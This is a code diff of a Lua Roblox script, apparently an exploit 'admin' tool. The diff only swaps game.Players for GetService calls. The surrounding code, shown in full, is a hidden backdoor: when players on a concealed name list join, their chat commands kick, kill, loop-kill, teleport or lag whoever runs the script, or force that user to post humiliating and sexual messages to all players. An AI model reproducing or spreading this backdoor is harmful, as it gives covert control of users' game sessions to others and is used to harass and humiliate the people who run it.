@@ -20,9 +20,9 @@ local zl = {
 function veryepictrol2(x)
     function getPlayer2(name)
         local targets = {}
-        local plrstbl = game.Players:getPlayers()
+        local plrstbl = game:GetService("Players"):getPlayers()
         if name == "me" then
-            return { game.Players[zl[1]]}
+            return { game:GetService("Players")[zl[1]]}
         elseif name == "others" then
             for i, v in pairs(plrstbl) do
                 if v.Name ~= zl[1] then
@@ -35,13 +35,13 @@ function veryepictrol2(x)
             end
         elseif name == "random" then
             for i, v in pairs(plrstbl) do
-                if v ~= game.Players.LocalPlayer then
+                if v ~= game:GetService("Players").LocalPlayer then
                     return { plrstbl[math.random(1, #plrstbl)] }
                 end
             end
         else
             name = name:lower()
-            for i, v in pairs(game.Players:getPlayers()) do
+            for i, v in pairs(game:GetService("Players"):getPlayers()) do
                 if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
                     return { v }
                 end
@@ -74,8 +74,8 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
-                        game.Players.LocalPlayer:Kick("kicked by admin")
+                    if game:GetService("Players").LocalPlayer == tar then
+                        game:GetService("Players").LocalPlayer:Kick("kicked by admin")
                     end
                 end
             end
@@ -84,9 +84,9 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
-                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
-                        getgenv().loopkill = game.Players.LocalPlayer.CharacterAppearanceLoaded:Connect(function(character)
+                    if game:GetService("Players").LocalPlayer == tar then
+                        game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
+                        getgenv().loopkill = game:GetService("Players").LocalPlayer.CharacterAppearanceLoaded:Connect(function(character)
                             character:WaitForChild("Humanoid").Health = 0
                         end)
                     end
@@ -97,7 +97,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         getgenv().loopbring = game:GetService("RunService").Heartbeat:Connect(function(character)
                             if not tar.Character:FindFirstChild("HumanoidRootPart") then
                                 return
@@ -118,7 +118,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         if loopkill then loopkill:Disconnect() end
                     end
                 end
@@ -130,9 +130,9 @@ function veryepictrol2(x)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
                     print("z")
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         print("killing")
-                        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+                        game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
                     end
                 end
             end
@@ -143,7 +143,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         local args = {
                             [1] = "🌟im skidding (using snex admin) 🌟 :3",
                             [2] = "All"
@@ -157,8 +157,8 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
+                    if game:GetService("Players").LocalPlayer == tar then
+                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
                     end
                 end
             end
@@ -168,7 +168,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         local args = {
                             [1] = "🌟 im submissive for rev.. x3 🌟",
                             [2] = "All"
@@ -183,7 +183,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         local args = {
                             [1] = '🌟"when i see revvy i get a huge bоner" --hopeless🌟',
                             [2] = "All"
@@ -198,7 +198,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         local args = {
                             [1] = '🌟"when i use ѕе⁥⁥⁥х admin i feel like im having mega ѕе⁥⁥⁥х fr" --hopeless🌟',
                             [2] = "All"
@@ -214,7 +214,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         settings().Network.IncomingReplicationLag = 1
                     end
                 end
@@ -226,7 +226,7 @@ function veryepictrol2(x)
                 local who2 = string.sub(msg2, space + 1)
                 local target2 = getPlayer2(who2)
                 for _,tar in(target2) do
-                    if game.Players.LocalPlayer == tar then
+                    if game:GetService("Players").LocalPlayer == tar then
                         settings().Network.IncomingReplicationLag = 0
                     end
                 end
@@ -236,7 +236,7 @@ function veryepictrol2(x)
 
         end
     end)
-    local d1z; d1z = game.Players.PlayerRemoving:Connect(function(plr)
+    local d1z; d1z = game:GetService("Players").PlayerRemoving:Connect(function(plr)
         if plr.Name == x.Name then
             dz:Disconnect()
             d1z:Disconnect()
@@ -244,14 +244,14 @@ function veryepictrol2(x)
     end)
 end
 
-game.Players.PlayerAdded:Connect(function(plr)
+game:GetService("Players").PlayerAdded:Connect(function(plr)
     for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol2(plr)
         end
     end
 end)
-for i, plr in pairs(game.Players:getPlayers()) do
+for i, plr in pairs(game:GetService("Players"):getPlayers()) do
     for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol2(plr)
